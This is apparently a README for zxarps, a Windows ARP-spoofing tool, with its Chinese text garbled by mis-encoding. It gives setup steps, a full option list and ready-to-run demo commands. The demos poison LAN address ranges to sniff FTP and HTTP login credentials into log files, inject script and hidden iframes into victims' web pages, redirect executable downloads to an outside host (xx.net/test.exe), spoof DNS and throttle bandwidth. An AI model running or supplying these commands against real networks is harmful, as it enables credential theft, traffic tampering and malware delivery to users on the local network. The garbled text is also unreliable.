#### ����
```txt
���Ի�����windows xp

��Ҫ�Ȱ�װ�ײ��һ�����������wincap
Ȼ���ٰ�װ��zxarps

��װ��Ϻ�ʹ��win+r��cmd����zxarps����Ŀ¼ִ�У�
zxarps.exe -idx 0 -ip <Ŀ���ַ> -p <�˿�"80">  -insert "<script>alert('chenqihao, sgoyi !')</script>"
```
#### ������ʾ��ʾ�ɹ�
![img1](����/1.png)
#### args
```txt
options:
    -idx [index]              ����������
    -ip [ip]                  ��ƭ��IP,��'-'ָ����Χ,','����
    -sethost [ip]             Ĭ��������,����ָ�����IP
    -port [port]              ��ע�Ķ˿�,��'-'ָ����Χ,','����,ûָ��Ĭ�Ϲ�ע���ж˿�
    -reset                    �ָ�Ŀ�����ARP��
    -hostname                 ̽������ʱ��ȡ��������Ϣ
    -logfilter [string]       ���ñ������ݵ�����������+-_��ǰ׺,����ؼ���,
                              ','�����ؼ���,�������'|'����
                              ���д�+ǰ׺�Ĺؼ��ֶ����ֵİ���д���ļ�
                              ��-ǰ׺�Ĺؼ��ֳ��ֵİ���д���ļ�
                              ��_ǰ׺�Ĺؼ���һ��������д���ļ�(����+-����ҲҪ����)
    -save_a [filename]        ����׽��������д���ļ� ACSIIģʽ
    -save_h [filename]        HEXģʽ
        
    -hacksite [ip]            ָ��Ҫ��������վ��������IP,
                              �������','����,ûָ����Ӱ������վ��
    -insert [html code]       ָ��Ҫ����html����
        
    -postfix [string]         ��ע�ĺ�׺����ֻ��עHTTP/1.1 302
    -hackURL [url]            ���ֹ�ע�ĺ�׺�����޸�URL���µ�URL
    -filename [name]          ��URL����Ч����Դ�ļ���
        
    -hackdns [string]         DNS��ƭ��ֻ�޸�UDP�ı���,�������','����
                              ��ʽ: ����|IP��www.aa.com|222.22.2.2,www.bb.com|1.1.1.1
        
    -Interval [ms]            ��ʱ��ƭ��ʱ������Ĭ����3��
    -spoofmode [1|2|3]        ������ƭ��������,��ƭ����:1Ϊ����,2ΪĿ���,3Ϊ����
    -speed [kb]               ����ָ����IP��IP�ε������ܴ���,��λ:KB��zxarps.exe -idx 2 -ip 192.168.10.177 -speed 1��
```
#### Demo
```txt
��ָ̽����IP���ж˿�80�����ݣ�����HEXģʽд���ļ�
zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.50 -port 80 -save_h sniff.log

FTP��̽,��21��2121�˿��г���USER��PASS�����ݰ���¼���ļ�
zxarps.exe -idx 0 -ip 192.168.0.2 -port 21,2121 -spoofmode 2 -logfilter "_USER ,_PASS" -save_a sniff.log

HTTP web�����½��һЩ��̳��½����̽,����������иĹؼ���
zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.50 -port 80 -logfilter "+POST ,+user,+pass" -save_a sniff.log

��|�����̽����,����FTP��HTTP��һЩ���йؼ��ֿ���һ����̽
zxarps.exe -idx 0 -ip 192.168.0.2 -port 80,21 -logfilter "+POST ,+user,+pass|_USER ,_PASS" -save_a sniff.log

�����̽��Ŀ�������ļ���׺��exe�������Location:Ϊhttp://xx.net/test.exe
zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.12,192.168.0.20-192.168.0.30 -spoofmode 3 
-postfix ".exe,.rar,.zip" -hackurl http://xx.net/ -filename test.exe

ָ����IP���е��û����ʵ�-hacksite�е���ַ��ֻ��ʾjust for fun
zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -hacksite 222.2.2.2,www.a.com,www.b.com 
-insert "just for fun<noframes>"

ָ����IP���е��û����ʵ�������վ������һ����ܴ���
zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -insert "<iframe src='xx' width=0 height=0>"

ָ��������IP���ܴ������Ƶ�20KB
zxarps.exe -idx 0 -ip 192.168.0.55,192.168.0.66 -speed 20

DNS��ƭ
zxarps.exe -idx 0 -ip 192.168.0.55,192.168.0.66 -hackdns "www.aa.com|222.22.2.2,www.bb.com|1.1.1.1"
```
